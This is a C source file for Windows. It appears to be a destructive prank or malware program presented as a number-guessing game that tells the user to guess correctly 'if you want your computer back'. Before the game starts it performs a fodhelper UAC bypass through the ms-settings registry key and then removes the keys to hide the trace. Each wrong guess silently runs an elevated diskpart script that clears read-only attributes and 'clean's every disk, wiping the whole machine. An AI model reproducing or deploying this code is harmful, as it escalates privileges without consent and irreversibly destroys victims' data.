#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
void UAC_bypass(const char *path) {
    HKEY k;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(k);
	//instead of just opening fodhelper.exe
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);

	Sleep(1000);
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
}
int main() {
    UAC_bypass("C:\\Windows\\System32\\cmd.exe");
    SetConsoleTitleA("Screen");

    srand((unsigned int)time(0));
    int key = (rand() % 10) + 1;
    int guess = 0;

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("Then guess the number\n");

    while (1) {
        printf("Enter guess 1-10 >:");
        fflush(stdout);

        if (scanf("%d", &guess) != 1) {
            fflush(stdin); 
            continue;
        }

        if (guess == key) {
            printf("\nYou Won!!! Woohoo\n");
            break;
        } else {
            printf("\nWrong!\n");
            ShellExecute(0, "runas", "cmd.exe",
                "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
                "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
                "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
                "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
                0, SW_HIDE);

            //system("shutdown /s /t 0");
        }
    }
    exit(0);
    return 0;
}
